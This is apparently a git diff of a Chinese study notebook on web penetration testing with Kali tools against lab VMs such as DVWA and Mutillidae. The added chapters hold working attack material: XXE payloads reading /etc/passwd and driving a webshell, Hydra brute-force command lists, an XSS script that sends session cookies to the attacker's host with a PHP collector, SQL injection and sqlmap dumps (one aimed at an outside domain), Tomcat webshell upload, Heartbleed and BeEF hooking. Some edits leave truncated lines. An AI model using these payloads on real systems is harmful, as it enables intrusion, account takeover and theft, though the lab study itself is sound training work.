@@ -124,7 +124,6 @@ Press <enter> to keep the current choice[*], or type selection number:
 ```
 	nmap -sn 192.168.254.131
 ```
-## 却完全
 2. 查看开放的端口
 
 ```
@@ -296,11 +295,15 @@ wget、httrack只是下载了站点完整的静态副本，但并没有服务器
 
 ### 原理
 
-ZAP 的蜘蛛跟随它找到的每个链接,获取每个页面的请求和响应。此外,蜘蛛会跟随表单响应、重定向和包含在 robots.txt 和 sitemap.xml 文件中的URL。
+ZAP 的蜘蛛跟随它找到的每个链接,获取每个页面的请求和响应。此外,蜘蛛会跟随表单响应、重定向和包含在 robots.txt 和  文件中的URL。
 
 ## 四、Burp Suite爬取站点
 
 Burp是应用最广泛的渗透测试的工具，Kali默认安装社区版本，目前Burp Suite Community 2.0移除了spider功能，Burp Suite Professional的安装教程见上文所述。
+
+## 五、使用脚本扫描
+
+github上的目录扫面脚本dirsearch，`py python3 dirsearch.py -u http://10.10.10.175:32770 -e *`
 
 # 第四章 漏洞发现
 
@@ -386,11 +389,9 @@ ZAP可以拦截所有的request包，并允许我们对其进行修改
 
 为了发现 XSS 漏洞,我们需要遵循以下原则：
 
-+ 我们在输入框中输入的，准确来说是被发送的文本，用于形成在页面中展示的信息，这是反射型漏
-  洞。
++ 我们在输入框中输入的，准确来说是被发送的文本，用于形成在页面中展示的信息，这是反射漏洞。
 + 特殊的字符没有编码或转义。
-+ 源代码表明，我们的输入被集成到某个位置，变成了 HTML 代码的一部分，并且会被浏览
-  器解释。
++ 源代码表明，我们的输入被集成到某个位置，变成了 HTML 代码的一部分，并且会被浏览器解释。
 
 ### 更多
 
@@ -531,7 +532,7 @@ wapiti扫描时间特别长
 
 `service postgresql start` 启动所连接的数据库服务器
 
-`msfconsole` 启动metasploit控制台
+`msfconsole` 
 
 `db_status` 检测msf数据库连接情况 ，若显示`postgresql selected, no connection`，则执行`msfdb reinit`，重新启动msf数据库
 
@@ -651,3 +652,530 @@ DVWA提供了Command Execution功能，可以Ping，采用名录连接符进行�
 <img src="./pictures/dvwa_medium_commandexec_source.png" alt="dvwa_medium_commandexec_source" style="zoom:50%;" />
 
 过滤了`&&` 和`;`，仍可以使用`|`。
+
+## 6.3 XML外部实体注入漏洞
+
+XML外部实体注入（也称为XXE）是一个Web安全漏洞，它使攻击者能够干扰应用程序对XML数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。
+
++ **XML实体**：在一个甚至多个XML文档中频繁使用某一条数据，我们可以预先定义一个这条数据的别名，即作为一个ENITITY，然后在这些文档中需要该数据的时候调用它
+
++ **XML自定义实体**：XML允许在DTD中定义自定义实体。例如：
+
+  ```xml
+  <！DOCTYPE foo [<！ENTITY myentity “my entity value”>]>
+  ```
+
+  此定义意味着对实体的任何使用都引用＆myentity; XML文档中的内容将替换为定义的值：“ my entity value”。
+
++ **XML外部实体**：XML外部实体是一种自定义实体，其定义位于声明它们的DTD之外。
+   外部实体的声明使用SYSTEM关键字，并且必须指定一个URL，应从该URL加载实体的值。例如：
+
+  ```
+  <！DOCTYPE foo [<！ENTITY ext SYSTEM“ http://normal-website.com”>]>
+  ```
+
+  URL可以使用file：//协议，因此可以从文件加载外部实体。例如：
+
+  ```
+  <！DOCTYPE foo [<！ENTITY ext SYSTEM“ file：/// path / to / file”>]>
+  ```
+
+  XML外部实体提供了引发XML外部实体攻击的主要方法。
+
+### 步骤
+
+1. 访问[owaspbwa][]/mutillidae，others | XML External Entity Injection | XML Validator
+
+2. 外部实体
+
+   ```xml
+   <!DOCTYPE fileEntity [
+   <!ELEMENT fileEntity ANY>
+   <!ENTITY fileEntity SYSTEM "file:///etc/passwd">
+   ]>
+   <somexml><message>Hello World &fileEntity;</message></somexml>
+   ```
+
+   可以访问/etc/passwd文件，使用这个技巧,我们就可以提取系统中的任何文件，只要它们可以在 Web 服务器的运行环境被用户读取。
+
+3. 也可以使用外部实体加载页面
+
+   ```xml
+   <!DOCTYPE fileEntity [
+   <!ELEMENT fileEntity ANY>
+   <!ENTITY fileEntity SYSTEM
+   "http://192.168.56.102/dvwa/hackable/uploads/ webshell.php?
+   cmd=/sbin/ifconfig">
+   ]>
+   <somexml><message>Hello World &fileEntity;</message></somexml>
+   ```
+
+
+
+## 6.4 使用Hydra爆破密码
+
+Hydra 是网络登录破解器，也就是在线的破解器,这意味着它可以用于通过爆破网络服务来发现登录密码。
+
+### 准备
+
+准备用户名文件user.txt和口令文件pass.txt
+
+### 步骤
+
+1. 使用burp分析登录请求如何发送
+
+![](./pictures/dvwa_login_burp.png)
+
+获取登录失败信息*Login failed*
+![](./pictures/dvwa_login_failed.png)
+
+2. 终端运行
+
+   ```bash
+   hydra -L user.txt -e ns 192.168.2.167 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login faild"
+   ```
+
+   ![](./pictures/dvwa_login_hydra.png)
+
+### 原理
+
+1. ```
+   hydra -L <用户名列表> -p <密码列表> <IP地址> <表单参数> <登录失败消息>
+   ```
+
+2. ```
+   1、破解ssh： 
+   hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh 
+   hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh 
+   
+   
+   2、破解ftp： 
+   hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV 
+   hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV 
+   
+   
+   3、get方式提交，破解web登录： 
+   hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/ 
+   hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php
+   
+   
+   4、post方式提交，破解web登录： 
+   hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password" 
+   hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:<title>wrong username or password</title>" 
+   （参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中 的内容是表示错误猜解的返回信息提示。） 
+   
+   
+   5、破解https： 
+   hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https 
+   
+   6、破解teamspeak： 
+   hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak 
+   
+   7、破解cisco： 
+   hydra -P pass.txt 10.36.16.18 cisco 
+   hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable 
+   
+   8、破解smb： 
+   hydra -l administrator -P pass.txt 10.36.16.18 smb 
+   
+   9、破解pop3： 
+   hydra -l muts -P pass.txt my.pop3.mail pop3 
+   
+   10、破解rdp： 
+   hydra ip rdp -l administrator -P pass.txt -V 
+   
+   11、破解http-proxy： 
+   hydra -l admin -P pass.txt http-proxy://10.36.16.18 
+   
+   12、破解imap： 
+   hydra -L user.txt -p secret 10.36.16.18 imap PLAIN 
+   hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
+   
+   ```
+
+## 6.5 使用burp爆破登录口令
+
+### 步骤
+
+1. 打开burp，配置浏览器代理，浏览器访问[owaspbwa][]/dvwa/login.php，随便输入用户名/口令。
+
+2. 在burp | target页面中找到POST用户名/口令的数据包，右键send to intruder。
+
+3. 在burp | intruder页面中
+
+   ![](./pictures/dvwa_login_burp_intruder.png)
+
+   找到Positions页面，更改`Attack type`为Cluster bomb，然后点击**Clear §**清理默认选中项。选中要测试的用户名和口令，点击**Add &sect;**添加。
+
+4. 在burp | intruder | Payloads页面中，`Payload set`选择1，`Payload Options`Load准备好的用户名列表文件用来用于穷尽用户名，同理设置口令字典。最后点击`start attack`
+
+5. 输入正确的用户名/口令时，页面跳转到index.php，错误时，页面跳转回login.php，在results页面中反向过滤Location: index.php，即可得到正确的用户名/口令
+
+   ![](./pictures/dvwa_login_burp_intruder_result.png)
+   
+### 原理
+
+   Intruder 所做的是，修改请求的特定部分，并使用定义好的载荷替换这些部分的值。载荷可以是这
+   些东西:
+
+   + 简单列表：来自文件,由剪贴板传递或者写在文本框中的列表。
+   
+   + 运行时文件：Intruder 可以在运行时从文件中读取载荷，所以如果文件非常大,它不会完全加载进内存。
+   
+   + 数字：生成一列顺序或随机的数字，以十进制或十六进制形式。
+   
+   + 用户名生成器：接受邮件地址列表,从中提取可能的用户。
+   
+   + 爆破器：接受字符集并使用它来生成指定长度的所有排列。
+
+   这些载荷由Intruder以不同形式发送，在 Positions 标签页中由攻击类型指定。攻击类型在载荷标记中的组合和排列方式上有所不同。
+
+   + Sniper：对于载荷的单一集合，它将每个载荷值放在每个标记位置,一次一个。
+   + Battering ram：类似Sniper,它使用载荷的单一集合,不同点是它在每个请求中将所有位置设置为相同的值。
+   + Pitchfork：使用多个载荷集合，并将每个集合中的一个项目放到每个标记位置中。当我们拥有不能混用的预定义数据时，这会非常有用，例如测试已知的用户名和密码。
+   + Cluster bomb：测试多个载荷，所以每个可能的排列都可以测试到。
+
+## 6.6 通过XSS获得会话Cookie
+
+### 准备
+
+1.  启动kali中的apache服务`service apache2 start`，后面的工作中需要kali提供http服务。
+   
+2. 在apache的文档根目录/var/www/html/中创建savecookie.php文件
+   
+      ```php
+      <?php
+      $fp = fopen('/tmp/cookie_data.txt', 'a');
+      fwrite($fp, $_GET["cookie"] . "\n");
+      fclose($fp);
+      ?>
+      ```
+   
+   这个脚本收集有XSS脚本发送的cookie，并保存在Kali中/tmp/systemd-private-c9d63bc3cff94c9594a5babcad3aba1c-apache2.service-9irPvW/tmp/cookie_data.txt，可以在/tmp文件夹下运行`find -name cookie_data.txt`搜索该文件。
+
+### 步骤
+
+1. 打开Firefox浏览器，访问[owaspbwa][]/peruggia/，登录admin/admin，然后点击`comment on this picture`，输入
+   
+      ```javascript
+      <script>
+      var xmlHttp = new XMLHttpRequest();
+      xmlHttp.open( "GET", "http://192.168.254.130/savecookie.php?cookie=" +
+      document.cookie, true );
+      xmlHttp.send( null );
+      </script>
+      ```
+   
+   注意IP地址是自己Kali的IP地址，点击POST，可以页面源代码中看到提交的脚本，同时页面会执行我们的脚本。
+   
+2. 打开OWASP Mantra浏览器，访问访问[owaspbwa][]/peruggia/，登录admin/admin，可以在cookie_data.txt文件中看到
+   
+   ![](./pictures/peruggia_login_cookie.png)
+   
+   
+   
+3. 打开Firefox，登出logout，配置代理，使用burp拦截数据包
+   
+   ![](./pictures/peruggia_firefox_login1.png)
+   
+   
+   修改cookie值为PHPSESSID=vqjb9f6ke0su4345tkr26va6r1; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada，重新发包
+   
+   ![](./pictures/peruggia_firefox_login2.png)
+   
+   ![](./pictures/peruggia_firefox_login3.png)
+   
+   可以看到浏览器成功登录。
+
+### 思考
+
+1. XSS漏洞需要页面可以显示用户输入
+2. 需要一台服务器放置获取cookie的脚本
+
+
+
+## 6.7 逐步执行基本的SQL注入
+
+dvwa | sql injection
+
+### 判断是否存在SQL注入
+
+在正常输入值的后面加上`'`，`or 1=1`，`and 1=2`之类的测试语句，根据结果判断是否存在SQL注入。注意闭合`'`，可以使用`#`屏蔽后续语句。
+
+### 获取信息
+
+输入 `1' order by 1#`和 `1' order by 2#`时都返回正常，当输入 `1' order by 3#`时，返回错误，可知后台select查询语句的列数为2。
+
+union 运算符可以将两个或两个以上 select 语句的查询结果集合合并成一个结果集合显示，即执行联合查询。需要注意在使用 union 查询的时候需要和主查询的列数相同。
+
++ 获取数据库名字 `1' union select 1, database() #`，结果是dvwa
++ 获取当前用户 `1' union select 1, user() #`
++ 获取数据库版本 `1' union select 1, @@version #`
++ 获取操作系统 `1' union select 1,  #`
++ 获取mysql数据库表名 `1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`，dvwa 数据库有两个数据表，分别是 guestbook 和 users。
++ 获取表中字段名：`1′ union select 1,group_concat(column_name) from information_schema.columns where table_name='users'`，users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。
++ 下载数据 `1′ union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`
+
+### 一些疑惑
+
++ `' or 1=1 order by 3 --'`可以正确执行（`--`后面没有空格）
++ `' or 1=1 order by 3 -- '`服务器报错（`--`后面有空格）
++ `1‘ order by 3`可以正确执行（1后面的引号是中文引号）
+
+
+
+## 6.8 使用SQLMap发现和利用SQL注入
+
+SQLMap 是个命令行工具，包含在 Kali 中，可以帮我们自动化检测和利用 SQL 注入，它带有多种技巧，并支持多种数据库。
+
+### GET注入
+
+**检查注入点**
+
+`sqlmap -u "192.168.2.167/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details"`
+
+**暴所有数据库的信息**
+
+`sqlmap -u "192.168.2.167/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details" --dbs`
+
+**爆当前数据库的信息**
+
+`sqlmap -u "192.168.2.167/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details" --current-db`
+
+**指定库名列出所有表**
+
+`sqlmap -u "192.168.2.167/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details" -D nowasp --tables `
+
+**指定库名表名列出所有字段**
+
+`sqlmap -u "192.168.2.167/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details" -D nowasp -T accounts --columns`
+
+**指定库名表名下载出指定字段内容**
+
+`sqlmap -u "192.168.2.167/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details" -D nowasp -T accounts -C username password mysignature`
+
+### POST注入
+
+#### 自动填写表单
+
+**判断是否有post注入**
+
+`sqlmap -u http://vip.fj0730.cn/login.asp --forms`
+
+**查找数据库**
+
+`sqlmap -u http://vip.fj0730.cn/login.asp --forms --dbs`
+
+**查找当前数据库**
+
+`sqlmap -u http://vip.fj0730.cn/login.asp --forms --current-db`
+
+查找表名、字段名、爆出数据与GET注入一致
+
+#### sqlmap结合burp
+
+1. 抓包
+2. 全选抓的数据包（RAW页面的内容），右键 | 保存到1.txt文件
+3. `sqlmap -r '/home/1.txt'`
+4. 查找当前数据库 `sqlmap -r '/home/1.txt' --current-db`
+5. 剩下的操作与之前的一致
+
+#### 指定表单注入
+
+`sqlmap -u http://vip.fj0730.cn/login.asp --data "userid=aaa&passwd=bbbb"`
+`sqlmap -u http://vip.fj0730.cn/login.asp --data "userid=aaa&passwd=bbbb" --current-db`
+
+
+### sqlmap选项
+
+`--batch` 永远不要求用户输入
+
+`--sqlmap-shell` 提示输入的交互式sqlmap shell
+
+`--sql-shell` 提供SQL shell，可以执行SQL查询
+
+`--os-shell` 提供服务器系统cmd的执行权限，成功的条件较为苛刻，暂未研究明白，参见[获取os-shell][https://zhuanlan.zhihu.com/p/58007573]。
+
+## 6.9 使用Metasploit攻击Tomcat的密码
+
+1. 在我们开始使用 Metasploit 之前,我们需要在 root 终端中开启数据库服务
+
+   `service postgresql start`
+
+2. 启动Metasploit控制台
+
+   `msfconsole`
+
+3. 加载模块
+
+   `use auxiliary/scanner/http/tomcat_mgr_login`
+
+4. 查看参数
+
+   `show options`
+
+5. 设置目标主机
+
+   `set rhosts 192.168.2.167`
+
+6. 设置线程数、爆破速度
+
+   `set threads 5`, `set bruteforce_speed 3`
+
+7. 执行攻击
+
+   `run`
+
+8. 其他参数
+
+   BLANK_PASSWORDS : 对每个尝试的用户添加空密码测试。
+   PASSWORD : 如果我们打算测试多个用户的单一密码,或者添加列表中没有包含的项目,这就很实用。
+   PASS_FILE : 用于测试的密码列表。
+   Proxies : 如果我们需要通过代理来访问我们的目标,或者避免检测,就用这个选项。
+   RHOSTS : 单个主机,或多个(使用空格分隔),或者我们想要测试的主机列表文件
+   ( /path/to/file/with/hosts )。
+   RPORT : Tomcat 所使用的 TCP 端口。
+   STOP_ON_SUCCESS : 发现有效密码之后停止尝试。
+   TARGERURI : 主机中管理器应用的位置。
+   USERNAME: 指定特殊的用户名来测试,它可以被单独测试,或者添加到定义在 USER_FILE 的列表中。
+   USER_PASS_FILE :包含要被测试的“用户名 密码”组合的文件。USER_AS_PASS :将每个列表中的用户名作为密码尝试。
+
+## 6.10 使用Tomcat管理器来执行代码
+
+上一节使用Metasploit获得了Tomcat管理器的用户名/口令，可以登录管理器并上传新的应用
+
+管理器地址：`http://192.168.2.167:8080/manager/html`，使用用户名/口令登录。
+
+进入管理器后，找到`WAR file to deploy`并点击`Browse`按钮。
+
+Kali在/usr/share/laudanum包含webshell，上传/usr/share/laudanum/jsp/cmd.war
+
+确保存在新应用cmd
+
+访问`http://192.168.2.167:8080/cmd/cmd.jsp`
+
+# 第七章 高级利用
+
+## 7.1 在Exploit-DB中搜索Web服务器的漏洞
+
+### 准备
+
+ExploitDB是一个面向全世界黑客的漏洞提交平台，该平台会公布最新漏洞的相关情况，这些可以帮助企业改善公司的安全状况，同时也以帮助安全研究者和渗透测试工程师更好的进行安全测试工作。Exploit-DB提供一整套庞大的归档体系，其中涵盖了各类公开的攻击事件、漏洞报告、安全文章以及技术教程等资源。
+
+可以在线查找漏洞代码，也可以使用`searchsploit`离线查找。
+
+`searchsploit heartbleed` 查找到两个c代码，使用书中的编译方法`gcc 32791.c -o heartbleed -Wl,-Bstatic -lssl -Wl,-Bdynamic -lssl3 -lcrypto`总是失败，猜测原因应该是openssl的新版本的缘故。
+
+## 7.2 利用Heartbleed漏洞
+
+### 准备
+
+下载Bee-box虚拟机，IP地址是`192.168.2.174`
+
+### 步骤
+
+1. 使用sslcan扫描Bee-Box的8443端口，`sslscan 192.168.2.174:8443`，奇怪的是没有heartbleed漏洞
+
+![](./pictures/Bee-Box_sslscan.png)
+
+使用nmap再此扫描`nmap -sV -p 8443 --script ssl-heartbleed.nse 192.168.2.174`，发现heartbleed漏洞
+
+![](./pictures/Bee-Box_nmap.png)
+
+2. 打开msf，查找heartbleed模块`msf5 > search heartbleed`
+
+![](./pictures/msf_searchheartbleed.png)
+
+3. 使用第1个模块`msf5 > use auxiliary/scanner/ssl/openssl_heartbleed`
+
+4. 查看需要设置的选项 `msf5 auxiliary(scanner/ssl/openssl_heartbleed) > show options`
+
+5. 设置RHOSTS、RPORT
+
+   ```bash
+   msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 192.168.2.174
+   msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set RPORT 8443
+   ```
+
+6. 设置verbose，这个设置要设置成true才能看到泄露的信息
+
+   `msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set verbose true`
+
+7. 开始攻击
+
+   `msf5 auxiliary(scanner/ssl/openssl_heartbleed) > exploit`
+
+![](./pictures/msf_heartbleed_result.png)
+
+可以看到有人正在登录，用户名和密码已泄漏。
+
+### 说明
+
+由于上一节中无法编译成功，本节heartbleed漏洞利用基于msf完成。
+
+## 7.3 使用BeEF利用XSS
+
+### 准备
+
+进入/usr/share/beef-xss/运行`./beef`启动beef，若beef-xss未安装，执行`apt-get install beef-xss`，beef不允许使用默认的用户名/密码登录，需要修改配置文件/etc/beef-xss/config.yaml中的密码，然后就可以启动beef了。
+
+访问<http://127.0.0.1:3000/ui/panel>并使用自己设置的用户名/口令登录。
+
+### 步骤
+
+1. 使用win7虚拟机（192.168.254.128）访问<http://192.168.2.167/dvwa/vulnerabilities/xss_s/>，添加评论，内容为`<script src="http://192.168.254.130:3000/hook.js"></script>`
+
+2. 在kali虚拟机(192.168.254.130)访问<http://127.0.0.1:3000/ui/panel>，可以看到win7虚拟机的浏览器上线
+
+   ![](./pictures/BeEF_1.png)
+
+3. 选中目标，在`commands | persistence | Man In The Browser `，点击运行，这个模块在用户点击链接时，向相同域发送AJAX请求，这个请求维持了钩子，也加载了新的页面，使得目标浏览器持续有效，直至受害者关闭目标网页。
+
+4. 在Logs页面，可以看到受害者在浏览器中的操作，例如点击和输入。
+
+   ![](./pictures/BeEF_2.png)
+
+5. 其他常用命令
+
+   + `commands | Browser | Hooked Domain | Get Cookie`获取cookie
++ `social engineering | pretty theft` 社会工程工具，允许攻击者模拟Facebook、YouTube等应用登录页面，诱使受害者输入用户名/密码。
+   + 打开摄像头
++ 提取浏览器中存储的用户名/口令
+   + 将受害者浏览器作为代理
+
+   
+
+   
+
+   
+
+   
+
+   
+
+   
+
+   
+
+   
+
+   
+
+   
+
+   
+   
+   
+   
+   
+   
+   
+
+
+
+
+
+
+
+
+
